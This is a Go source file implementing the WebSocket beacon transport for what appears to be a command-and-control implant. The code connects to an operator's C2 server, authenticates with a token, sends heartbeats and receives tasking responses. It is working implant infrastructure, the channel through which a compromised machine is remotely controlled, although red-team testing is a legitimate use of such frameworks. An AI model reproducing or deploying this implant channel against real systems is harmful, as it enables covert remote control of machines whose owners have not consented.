package transport

import (
	"fmt"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"golang.org/x/net/websocket"
)

// WSTransport implements Transport over WebSocket.
type WSTransport struct {
	wsURL string
	token string
	conn  *websocket.Conn
}

// NewWS creates a WebSocket transport.
// Converts http(s):// to ws(s):// automatically.
func NewWS(serverURL, token string) *WSTransport {
	wsURL := toWSScheme(serverURL) + "/api/v1/implant/ws"
	return &WSTransport{
		wsURL: wsURL,
		token: token,
	}
}

func (w *WSTransport) Name() string { return "ws" }

func (w *WSTransport) Close() error {
	if w.conn != nil {
		return w.conn.Close()
	}
	return nil
}

func (w *WSTransport) Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error) {
	if w.conn == nil {
		conn, err := websocket.Dial(w.wsURL, "", "http://localhost")
		if err != nil {
			return nil, fmt.Errorf("ws dial: %w", err)
		}
		w.conn = conn

		// Authenticate
		auth := map[string]string{"type": "auth", "token": w.token}
		if err := websocket.JSON.Send(w.conn, auth); err != nil {
			w.conn.Close()
			w.conn = nil
			return nil, fmt.Errorf("ws auth send: %w", err)
		}

		var authResp map[string]string
		if err := websocket.JSON.Receive(w.conn, &authResp); err != nil {
			w.conn.Close()
			w.conn = nil
			return nil, fmt.Errorf("ws auth resp: %w", err)
		}
		if authResp["status"] != "ok" {
			w.conn.Close()
			w.conn = nil
			return nil, fmt.Errorf("ws auth failed: %s", authResp["error"])
		}
	}

	// Send heartbeat
	if err := websocket.JSON.Send(w.conn, hb); err != nil {
		w.conn.Close()
		w.conn = nil
		return nil, fmt.Errorf("ws send: %w", err)
	}

	// Set read deadline
	w.conn.SetDeadline(time.Now().Add(15 * time.Second))

	// Read response
	var br beacon.BeaconResponse
	if err := websocket.JSON.Receive(w.conn, &br); err != nil {
		w.conn.Close()
		w.conn = nil
		return nil, fmt.Errorf("ws recv: %w", err)
	}

	w.conn.SetDeadline(time.Time{}) // Clear deadline
	return &br, nil
}

func toWSScheme(u string) string {
	if len(u) > 5 && u[:5] == "https" {
		return "wss" + u[5:]
	}
	if len(u) > 4 && u[:4] == "http" {
		return "ws" + u[4:]
	}
	return u
}
